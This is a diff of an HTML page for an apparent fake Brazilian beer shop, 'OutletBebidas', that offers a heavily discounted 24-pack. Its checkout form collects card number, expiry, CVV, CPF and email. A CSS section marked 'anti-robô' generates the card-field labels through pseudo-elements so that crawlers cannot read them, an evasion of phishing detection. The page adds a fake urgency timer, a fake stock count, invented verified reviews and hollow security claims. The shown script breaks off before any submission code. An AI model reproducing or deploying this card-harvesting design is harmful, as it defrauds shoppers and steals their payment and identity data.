@@ -9,166 +9,569 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 
     <style>
-        /* --- RESET E BASE --- */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        body { background-color: #f0f2f5; color: #333; padding-bottom: 100px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            color: #333;
+            padding-bottom: 100px;
+        }
 
         /* --- CAMUFLAGEM DE TEXTO (ANTI-ROBÔ) --- */
-        /* O texto é gerado pelo CSS, não existe no HTML para o robô ler */
-        .l-cc::after { content: 'Numeração Principal'; }
-        .l-nm::after { content: 'Nome do Titular'; }
-        .l-dt::after { content: 'Vencimento (MM/AA)'; }
-        .l-cv::after { content: 'Cód. CVV'; }
-        .l-dc::after { content: 'CPF do Titular'; }
-        
-        .l-cc, .l-nm, .l-dt, .l-cv, .l-dc {
-            font-size: 12px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; text-transform: uppercase;
+        .l-cc::after {
+            content: 'Numeração Principal';
         }
 
-        /* --- 1. AGE GATE --- */
+        .l-nm::after {
+            content: 'Nome do Titular';
+        }
+
+        .l-dt::after {
+            content: 'Vencimento (MM/AA)';
+        }
+
+        .l-cv::after {
+            content: 'Cód. CVV';
+        }
+
+        .l-dc::after {
+            content: 'CPF do Titular';
+        }
+
+        .l-em::after {
+            content: 'E-mail para Confirmação';
+        }
+
+        .l-cc, .l-nm, .l-dt, .l-cv, .l-dc, .l-em {
+            font-size: 11px;
+            font-weight: 700;
+            color: #444;
+            margin-bottom: 6px;
+            display: block;
+            text-transform: uppercase;
+        }
+
         #age-gate {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 99999;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            color: white; text-align: center; padding: 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 99999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
         }
+
         .age-btn {
-            padding: 16px 40px; border: none; font-weight: 800; cursor: pointer; font-size: 16px; border-radius: 50px; margin: 10px; text-transform: uppercase; letter-spacing: 1px;
+            padding: 16px 40px;
+            border: none;
+            font-weight: 800;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 50px;
+            margin: 10px;
+            text-transform: uppercase;
         }
-        .btn-yes { background: #008200; color: white; box-shadow: 0 4px 15px rgba(0,130,0,0.4); }
-        .btn-no { background: #333; color: #777; border: 1px solid #444; }
 
-        /* --- 2. HEADER VERDE --- */
-        .app-header { 
-            background: linear-gradient(90deg, #005c00, #008200); 
-            height: 60px; display: flex; align-items: center; justify-content: space-between;
-            padding: 0 15px; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        .btn-yes {
+            background: #008200;
+            color: white;
+            box-shadow: 0 4px 15px rgba(0,130,0,0.4);
         }
+
+        .btn-no {
+            background: #333;
+            color: #777;
+            border: 1px solid #444;
+        }
+
+        .app-header {
+            background: linear-gradient(90deg, #005c00, #008200);
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
         .search-bar {
-            flex: 1; background: rgba(255,255,255,0.2); height: 36px; border-radius: 4px;
-            display: flex; align-items: center; padding: 0 10px; color: rgba(255,255,255,0.9); font-size: 13px; margin: 0 15px;
-        }
-        .search-input {
-            background: transparent; border: none; color: white; width: 100%; outline: none; margin-left: 8px; font-size: 13px;
-        }
-        .search-input::placeholder { color: rgba(255,255,255,0.7); }
-        
-        .cart-icon { position: relative; color: white; font-size: 20px; }
-        .badge-count { 
-            position: absolute; top: -5px; right: -5px; background: #e60012; color: white; 
-            font-size: 10px; font-weight: bold; padding: 2px 5px; border-radius: 10px; border: 1px solid white;
+            flex: 1;
+            background: rgba(255,255,255,0.2);
+            height: 36px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            padding: 0 10px;
+            color: rgba(255,255,255,0.9);
+            font-size: 13px;
+            margin: 0 15px;
         }
 
-        /* --- 3. PRODUTO --- */
-        .product-card { background: white; margin-bottom: 10px; position: relative; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .img-wrapper { text-align: center; padding: 20px; position: relative; }
-        .img-wrapper img { max-width: 100%; height: auto; max-height: 350px; object-fit: contain; }
+        .search-input {
+            background: transparent;
+            border: none;
+            color: white;
+            width: 100%;
+            outline: none;
+            margin-left: 8px;
+            font-size: 13px;
+        }
+
+            .search-input::placeholder {
+                color: rgba(255,255,255,0.7);
+            }
+
+        .cart-icon {
+            position: relative;
+            color: white;
+            font-size: 20px;
+        }
+
+        .badge-count {
+            position: absolute;
+            top: -5px;
+            right: -5px;
+            background: #e60012;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            padding: 2px 5px;
+            border-radius: 10px;
+            border: 1px solid white;
+        }
+
+        .product-card {
+            background: white;
+            margin-bottom: 10px;
+            position: relative;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .img-wrapper {
+            text-align: center;
+            padding: 20px;
+            position: relative;
+        }
+
+            .img-wrapper img {
+                max-width: 100%;
+                height: auto;
+                max-height: 350px;
+                object-fit: contain;
+            }
 
         .discount-tag {
-            position: absolute; top: 15px; right: 15px; background: #008200; color: white;
-            font-weight: 800; font-size: 12px; padding: 4px 8px; border-radius: 4px;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #008200;
+            color: white;
+            font-weight: 800;
+            font-size: 12px;
+            padding: 4px 8px;
+            border-radius: 4px;
         }
 
-        /* TIMER REAL */
         .flash-bar {
             background: linear-gradient(90deg, #003300, #005c00);
-            color: white; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center;
+            color: white;
+            padding: 12px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .timer-container { font-family: monospace; font-size: 14px; font-weight: bold; color: #ffeb3b; display: flex; gap: 3px; align-items: center; }
-        .timer-box { background: white; color: #003300; padding: 2px 4px; border-radius: 3px; }
 
-        .info-box { padding: 15px; }
-        .price-row { display: flex; align-items: baseline; gap: 8px; margin-top: 5px; }
-        .currency { color: #008200; font-size: 14px; font-weight: 600; }
-        .price { color: #008200; font-size: 34px; font-weight: 900; letter-spacing: -1px; }
-        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
-        
-        h1 { font-size: 18px; font-weight: 600; line-height: 1.4; margin: 10px 0; color: #222; }
+        .timer-container {
+            font-family: monospace;
+            font-size: 14px;
+            font-weight: bold;
+            color: #ffeb3b;
+            display: flex;
+            gap: 3px;
+            align-items: center;
+        }
 
-        /* BARRA DE ESTOQUE */
-        .stock-bar-container { display: flex; align-items: center; gap: 10px; margin-top: 15px; }
-        .stock-track { flex: 1; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; }
-        .stock-fill { height: 100%; width: 85%; background: linear-gradient(90deg, #008200, #4cbf4c); border-radius: 10px; animation: stockPulse 2s infinite; }
-        .stock-text { font-size: 12px; color: #008200; font-weight: 700; white-space: nowrap; }
+        .timer-box {
+            background: white;
+            color: #003300;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
 
-        /* --- 4. EXTRAS --- */
-        .section { background: white; padding: 15px; margin-top: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .guarantee-row { display: flex; justify-content: space-between; text-align: center; }
-        .g-item { font-size: 10px; color: #555; display: flex; flex-direction: column; align-items: center; gap: 5px; }
-        .g-icon { font-size: 18px; color: #008200; background: #eaffea; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
+        .info-box {
+            padding: 15px;
+        }
 
-        .review-item { border-bottom: 1px solid #f0f0f0; padding-bottom: 15px; margin-bottom: 15px; }
-        .review-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-        .review-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
-        .user-name { font-size: 12px; font-weight: 700; color: #333; }
-        .verified-badge { color: #008200; font-size: 10px; display: flex; align-items: center; gap: 3px; }
-        .stars { color: #ffc107; font-size: 11px; margin-bottom: 5px; }
-        .review-text { font-size: 13px; color: #555; line-height: 1.4; }
+        .price-row {
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+            margin-top: 5px;
+        }
 
-        /* --- 5. FOOTER --- */
+        .currency {
+            color: #008200;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .price {
+            color: #008200;
+            font-size: 34px;
+            font-weight: 900;
+            letter-spacing: -1px;
+        }
+
+        .old-price {
+            color: #999;
+            text-decoration: line-through;
+            font-size: 14px;
+        }
+
+        h1 {
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 1.4;
+            margin: 10px 0;
+            color: #222;
+        }
+
+        .stock-bar-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .stock-track {
+            flex: 1;
+            height: 8px;
+            background: #eee;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .stock-fill {
+            height: 100%;
+            width: 85%;
+            background: linear-gradient(90deg, #008200, #4cbf4c);
+            border-radius: 10px;
+            animation: stockPulse 2s infinite;
+        }
+
+        .stock-text {
+            font-size: 12px;
+            color: #008200;
+            font-weight: 700;
+            white-space: nowrap;
+        }
+
+        .section {
+            background: white;
+            padding: 15px;
+            margin-top: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .guarantee-row {
+            display: flex;
+            justify-content: space-between;
+            text-align: center;
+        }
+
+        .g-item {
+            font-size: 10px;
+            color: #555;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .g-icon {
+            font-size: 18px;
+            color: #008200;
+            background: #eaffea;
+            width: 35px;
+            height: 35px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        .review-item {
+            border-bottom: 1px solid #f0f0f0;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+        }
+
+            .review-item:last-child {
+                border-bottom: none;
+                margin-bottom: 0;
+                padding-bottom: 0;
+            }
+
+        .review-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 5px;
+        }
+
+        .user-name {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333;
+        }
+
+        .verified-badge {
+            color: #008200;
+            font-size: 10px;
+            display: flex;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .stars {
+            color: #ffc107;
+            font-size: 11px;
+            margin-bottom: 5px;
+        }
+
+        .review-text {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.4;
+        }
+
         .sticky-footer {
-            position: fixed; bottom: 0; left: 0; width: 100%; background: white;
-            box-shadow: 0 -4px 20px rgba(0,0,0,0.1); padding: 12px 20px;
-            display: flex; align-items: center; gap: 15px; z-index: 99; border-top: 1px solid #eee;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            z-index: 99;
+            border-top: 1px solid #eee;
         }
-        .footer-price { display: flex; flex-direction: column; }
-        .fp-label { font-size: 10px; color: #666; }
-        .fp-val { color: #008200; font-weight: 800; font-size: 24px; }
+
+        .footer-price {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .fp-label {
+            font-size: 10px;
+            color: #666;
+        }
+
+        .fp-val {
+            color: #008200;
+            font-weight: 800;
+            font-size: 24px;
+        }
+
         .btn-buy-sticky {
-            flex: 1; background: #008200; color: white; border: none;
-            padding: 16px; border-radius: 8px; font-weight: 700; font-size: 16px;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 130, 0, 0.4);
-            animation: pulse 2s infinite; display: flex; align-items: center; justify-content: center; gap: 10px;
+            flex: 1;
+            background: #008200;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 130, 0, 0.4);
+            animation: pulse 2s infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        /* --- 6. CHECKOUT MODAL --- */
         .modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); z-index: 10000;
-            align-items: flex-end; backdrop-filter: blur(2px);
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.6);
+            z-index: 10000;
+            align-items: flex-end;
+            backdrop-filter: blur(2px);
         }
+
         .bottom-sheet {
-            background: #fff; width: 100%; max-width: 500px; margin: 0 auto;
-            border-radius: 20px 20px 0 0; padding: 0;
-            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
-            position: relative; max-height: 90vh; overflow-y: auto;
+            background: #fff;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            border-radius: 20px 20px 0 0;
+            padding: 0;
+            transform: translateY(100%);
+            transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
         }
-        .sheet-active { transform: translateY(0); }
-        
-        .sheet-header { 
-            background: #f8f9fa; padding: 20px; border-radius: 20px 20px 0 0; border-bottom: 1px solid #eee;
-            display: flex; justify-content: space-between; align-items: center;
+
+        .sheet-active {
+            transform: translateY(0);
         }
-        .sheet-title { font-weight: 800; font-size: 16px; color: #333; display: flex; align-items: center; gap: 8px; }
 
-        .sheet-body { padding: 25px 20px; }
-
-        .input-box { margin-bottom: 18px; position: relative; }
-        
-        .input-wrapper { position: relative; }
-        .input-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #999; font-size: 16px; }
-        
-        .input-field { 
-            width: 100%; padding: 14px 14px 14px 45px; 
-            border: 1px solid #ddd; border-radius: 8px; 
-            font-size: 16px; background: #fff; transition: 0.2s; color: #333;
+        .sheet-header {
+            background: #f8f9fa;
+            padding: 18px 20px;
+            border-radius: 20px 20px 0 0;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-        .input-field:focus { border-color: #008200; outline: none; box-shadow: 0 0 0 3px rgba(0,130,0,0.1); }
 
-        .card-flags { display: flex; gap: 10px; margin: 15px 0 25px 0; opacity: 0.7; justify-content: center; }
-        .card-flags i { font-size: 24px; color: #555; }
+        .sheet-title {
+            font-weight: 800;
+            font-size: 15px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
 
-        .checkout-footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
+        .sheet-body {
+            padding: 20px;
+        }
+
+        .input-box {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+            font-size: 16px;
+            transition: 0.3s;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 12px 12px 45px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #fff;
+            outline: none;
+            transition: 0.2s;
+        }
+
+            .input-field:focus {
+                border-color: #008200;
+                box-shadow: 0 0 0 3px rgba(0,130,0,0.1);
+            }
+
+        .card-flags {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            opacity: 0.5;
+            justify-content: center;
+        }
+
+        .checkout-footer {
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+            margin-top: 15px;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+        }
 
         #loading-screen {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255,255,255,0.95); z-index: 10001; align-items: center; justify-content: center; flex-direction: column;
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 10001;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
         }
-        .spinner { width: 50px; height: 50px; border: 4px solid #eee; border-top-color: #008200; border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
-        @keyframes stockPulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #eee;
+            border-top-color: #008200;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+
+            50% {
+                transform: scale(1.02);
+            }
+
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes stockPulse {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.8;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
     </style>
 </head>
 <body>
@@ -186,29 +589,24 @@
     <header class="app-header">
         <div style="color:white; font-weight:800; font-size:18px;">Outlet<span style="color:#ffc107">Bebidas</span></div>
         <div class="search-bar">
-            <i class="fas fa-search" style="color: white; cursor: pointer;" onclick="realizarBusca()"></i> 
+            <i class="fas fa-search" style="color: white; cursor: pointer;" onclick="realizarBusca()"></i>
             <input type="text" id="search-input" class="search-input" placeholder="Buscar em Ofertas...">
         </div>
-        <div class="cart-icon">
-            <i class="fas fa-shopping-cart"></i>
-            <span class="badge-count">1</span>
-        </div>
+        <div class="cart-icon"><i class="fas fa-shopping-cart"></i><span class="badge-count">1</span></div>
     </header>
 
     <main>
         <div class="product-card" id="produto-destaque">
             <div class="img-wrapper">
                 <span class="discount-tag">-45% OFF</span>
-                <img src="https://i.postimg.cc/8ck5hnCg/agora-sim-vai.png" 
-                     class="imagem-produto" 
-                     alt="Produto">
+                <img src="https://i.postimg.cc/8ck5hnCg/agora-sim-vai.png" class="imagem-produto" alt="Produto">
             </div>
 
             <div class="flash-bar">
                 <div style="font-weight:800; font-style:italic; font-size: 13px;"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
                 <div class="timer-container">
                     <span>Expira em: </span>
-                    <span id="timer-min" class="timer-box">14</span> : 
+                    <span id="timer-min" class="timer-box">14</span> :
                     <span id="timer-sec" class="timer-box">59</span>
                 </div>
             </div>
@@ -217,10 +615,9 @@
                 <div class="price-row">
                     <span class="currency">R$</span>
                     <span class="price">89,90</span>
-                    <span class="old-price">R$ 149,90</span>
+                    <span class="old-price">R$ 159,90</span>
                 </div>
-                <h1>Pack Cerveja Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
-                
+                <h1>Pack Cerveja  Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
                 <div class="stock-bar-container">
                     <div class="stock-track"><div class="stock-fill"></div></div>
                     <span class="stock-text">Restam 18 packs</span>
@@ -238,80 +635,92 @@
         </div>
 
         <div class="section">
+            <h3 style="font-size: 12px; margin-bottom: 20px; text-transform: uppercase; color: #666; letter-spacing: 1px;">Acompanhe seu pedido</h3>
+            <div style="display: flex; flex-direction: column; gap: 20px;">
+                <div style="display: flex; gap: 15px;">
+                    <div style="color: #008200; font-size: 18px;"><i class="fas fa-check-circle"></i></div>
+                    <div>
+                        <div style="font-size: 13px; font-weight: 800;">Pagamento Processado</div>
+                        <div style="font-size: 11px; color: #888;">Confirmação imediata enviada para o seu e-mail.</div>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 15px;">
+                    <div style="color: #008200; font-size: 18px;"><i class="fas fa-box"></i></div>
+                    <div>
+                        <div style="font-size: 13px; font-weight: 800;">Despacho em 12h</div>
+                        <div style="font-size: 11px; color: #888;">Embalagem térmica reforçada para garantir a qualidade.</div>
+                    </div>
+                </div>
+                <div style="display: flex; gap: 15px;">
+                    <div style="color: #008200; font-size: 18px;"><i class="fas fa-truck-fast"></i></div>
+                    <div>
+                        <div style="font-size: 13px; font-weight: 800;">Entrega Expressa</div>
+                        <div style="font-size: 11px; color: #888;">Receba o rastreio via WhatsApp assim que sair para entrega.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
-                <h3 style="font-size:14px; color:#333;">Avaliações (26)</h3>
+                <h3 style="font-size:14px; color:#333;">Avaliações (23)</h3>
                 <span style="color:#008200; font-size:12px; font-weight:bold;">Ver tudo <i class="fas fa-chevron-right"></i></span>
             </div>
-
             <div class="review-item">
-                <div class="review-header">
-                    <span class="user-name">Ricardo Mendes</span>
-                    <span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span>
-                </div>
+                <div class="review-header"><span class="user-name">Ricardo Mendes</span><span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span></div>
                 <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                 <p class="review-text">Chegou gelada kkkk brincadeira, chegou muito rápido. Preço imbatível, vou comprar mais para o churrasco.</p>
             </div>
-
             <div class="review-item">
-                <div class="review-header">
-                    <span class="user-name">Ana Clara Souza</span>
-                    <span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span>
-                </div>
+                <div class="review-header"><span class="user-name">Ana Clara Souza</span><span class="verified-badge"><i class="fas fa-check-circle"></i> Compra Verificada</span></div>
                 <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                 <p class="review-text">Tudo certinho, caixa lacrada e original. Validade pra 2026. Recomendo o vendedor.</p>
             </div>
         </div>
 
         <div style="background: #fff; padding: 30px 20px; text-align: center; font-size: 11px; color: #888; margin-top: 20px; border-top: 1px solid #eee;">
-            <p style="margin-bottom: 15px; color: #008200; font-weight: bold;">
-                <i class="fas fa-lock"></i> Site protegido com certificado SSL 256-bit.
-            </p>
-            <p>
-                outletbebidas  LTDA<br>
-                CNPJ: 45.123.000/0001-99<br>
-                Bahia, BA
-            </p>
-            <div style="margin-top: 15px; display: flex; justify-content: center; gap: 10px;">
-                <i class="fab fa-cc-visa fa-2x"></i>
-                <i class="fab fa-cc-mastercard fa-2x"></i>
-                <i class="fas fa-barcode fa-2x"></i>
-            </div>
+            <p style="margin-bottom: 15px; color: #008200; font-weight: bold;"><i class="fas fa-lock"></i> Site protegido com certificado SSL 256-bit.</p>
+            <p>outlet BEBIDAS LTDA<br>CNPJ: 45.123.000/0001-99<br>Bahia, BA</p>
+            <div style="margin-top: 15px; display: flex; justify-content: center; gap: 10px;"><i class="fab fa-cc-visa fa-2x"></i><i class="fab fa-cc-mastercard fa-2x"></i><i class="fas fa-barcode fa-2x"></i></div>
             <p style="margin-top: 15px;">© 2026 Todos os direitos reservados.</p>
         </div>
     </main>
 
     <div class="sticky-footer">
-        <div class="footer-price">
-            <span class="fp-label">Total:</span>
-            <span class="fp-val">R$ 89,90</span>
-        </div>
-        <button class="btn-buy-sticky" onclick="abrirCheckout()">
-            COMPRAR AGORA <i class="fas fa-arrow-right"></i>
-        </button>
+        <div class="footer-price"><span class="fp-label">Total:</span><span class="fp-val">R$ 89,90</span></div>
+        <button class="btn-buy-sticky" onclick="abrirCheckout()">COMPRAR AGORA <i class="fas fa-arrow-right"></i></button>
     </div>
 
     <div id="modal-checkout" class="modal-overlay" onclick="fecharCheckout(event)">
         <div class="bottom-sheet" onclick="event.stopPropagation()">
-            
             <div class="sheet-header">
-                <div class="sheet-title">
-                    <i class="fas fa-lock" style="color: #008200;"></i> Pagamento Seguro
-                </div>
-                <div onclick="fecharCheckoutDireto()" style="font-size: 20px; cursor: pointer; color: #999;">
-                    <i class="fas fa-times"></i>
-                </div>
+                <div class="sheet-title"><i class="fas fa-lock" style="color: #008200;"></i> Checkout Seguro</div>
+                <div onclick="fecharCheckoutDireto()" style="font-size: 18px; cursor: pointer; color: #999;"><i class="fas fa-times"></i></div>
             </div>
 
             <div class="sheet-body">
-                <div style="text-align: center; margin-bottom: 20px; color: #555; font-size: 13px;">
-                    Preencha os dados do cartão para finalizar.
+                <div style="background: #fdfdfd; border: 1px solid #eee; border-radius: 10px; padding: 12px; margin-bottom: 15px; display: flex; align-items: center; gap: 12px;">
+                    <img src="https://i.postimg.cc/8ck5hnCg/agora-sim-vai.png" style="width: 45px; height: 45px; object-fit: contain; border-radius: 5px;">
+                    <div style="flex: 1;">
+                        <div style="font-size: 11px; font-weight: 800; color: #333;">Pack (24 un)</div>
+                        <div style="font-size: 10px; color: #888;">Frete: <span style="color: #008200; font-weight: bold;">Grátis</span></div>
+                    </div>
+                    <div style="font-weight: 800; color: #008200; font-size: 13px;">R$ 89,90</div>
+                </div>
+
+                <div class="input-box">
+                    <label class="l-em"></label>
+                    <div class="input-wrapper">
+                        <i class="far fa-envelope input-icon"></i>
+                        <input type="email" id="field_email" class="input-field" placeholder="seu@email.com">
+                    </div>
                 </div>
 
                 <div class="input-box">
                     <label class="l-cc"></label>
                     <div class="input-wrapper">
-                        <i class="far fa-credit-card input-icon"></i>
-                        <input type="tel" id="field_a" class="input-field" maxlength="19" placeholder="0000 0000 0000 0000"> 
+                        <i id="card-icon" class="far fa-credit-card input-icon"></i>
+                        <input type="tel" id="field_a" class="input-field" maxlength="19" placeholder="0000 0000 0000 0000">
                     </div>
                 </div>
 
@@ -323,7 +732,7 @@
                     </div>
                 </div>
 
-                <div style="display:flex; gap:15px;">
+                <div style="display:flex; gap:12px;">
                     <div class="input-box" style="flex:1;">
                         <label class="l-dt"></label>
                         <div class="input-wrapper">
@@ -335,7 +744,7 @@
                         <label class="l-cv"></label>
                         <div class="input-wrapper">
                             <i class="fas fa-lock input-icon"></i>
-                            <input type="tel" id="field_d" class="input-field" maxlength="4" placeholder="123">
+                            <input type="tel" id="field_d" class="input-field" maxlength="4" placeholder="CVV">
                         </div>
                     </div>
                 </div>
@@ -348,26 +757,15 @@
                     </div>
                 </div>
 
-                <div class="input-box">
-    <label style="font-size: 12px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; text-transform: uppercase;">E-mail para Confirmação</label>
-    <div class="input-wrapper">
-        <i class="far fa-envelope input-icon"></i>
-        <input type="email" id="field_email" class="input-field" placeholder="seu@email.com">
-                 </div>
-          </div>
+                <div class="card-flags"><i class="fab fa-cc-visa fa-2x"></i><i class="fab fa-cc-mastercard fa-2x"></i><i class="fab fa-cc-amex fa-2x"></i></div>
 
-                <div class="card-flags">
-                    <i class="fab fa-cc-visa" style="color:#1a1f71;"></i>
-                    <i class="fab fa-cc-mastercard" style="color:#eb001b;"></i>
-                    <i class="fab fa-cc-amex" style="color:#2e77bc;"></i>
-                </div>
-
-                <button class="btn-buy-sticky" style="width:100%; margin-top:10px; background:#008200;" onclick="finalizarCompra()">
-                    <i class="fas fa-lock"></i> CONFIRMAR PAGAMENTO
+                <button class="btn-buy-sticky" style="width:100%; margin-top:5px; background:#008200;" onclick="finalizarCompra()">
+                    <i class="fas fa-shield-alt"></i> CONFIRMAR PAGAMENTO
                 </button>
 
                 <div class="checkout-footer">
-                    <i class="fas fa-shield-alt"></i> Seus dados estão protegidos e criptografados.
+                    <p style="margin-bottom: 5px;">Não recebeu? Garantimos devolução em até 7 dias.</p>
+                    <i class="fas fa-shield-alt"></i> Ambiente 100% criptografado.
                 </div>
             </div>
         </div>
@@ -377,59 +775,51 @@
         <div id="spinner" class="spinner"></div>
         <div id="success-msg" style="display:none; text-align:center;">
             <i class="fas fa-check-circle" style="font-size:60px; color:#00a000; margin-bottom:20px;"></i>
-            <h2>Pedido Confirmado!</h2>
-            <p style="color:#666; margin-top:10px;">Enviamos um e-mail com os detalhes.</p>
+            <h2>Pedido Recebido!</h2>
+            <p style="color:#666; margin-top:10px;">Verifique seu e-mail para o rastreio.</p>
         </div>
     </div>
 
     <script>
-        // --- BUSCA FUNCIONAL ---
+        // BUSCA
         function realizarBusca() {
             const input = document.getElementById('search-input');
             const termo = input.value.toLowerCase().trim();
-
-            if (termo === "") { alert("Digite algo para buscar!"); return; }
-
+            if (termo === "") return;
             input.value = "Buscando...";
-            input.disabled = true;
-
             setTimeout(() => {
-                input.value = termo; 
-                input.disabled = false;
-                if (termo.includes('heineken') || termo.includes('cerveja')) {
-                    alert("Você já está na melhor oferta de cerveja do dia!");
-                    document.getElementById('produto-destaque').scrollIntoView({behavior: "smooth"});
-                } else {
-                    alert("Produto esgotado! Aproveite a oferta do Pack Heineken.");
-                }
-            }, 800);
+                input.value = termo;
+                if (termo.includes('heineken')) { document.getElementById('produto-destaque').scrollIntoView({ behavior: "smooth" }); }
+                else { alert("Produto indisponível! Aproveite a oferta do Pack Heineken."); }
+            }, 600);
         }
 
-        document.getElementById('search-input').addEventListener('keypress', function (e) {
-            if (e.key === 'Enter') { realizarBusca(); }
-        });
-
-        // --- TIMER ---
+        // TIMER
         function startTimer(duration, displayMin, displaySec) {
             var timer = duration, minutes, seconds;
             setInterval(function () {
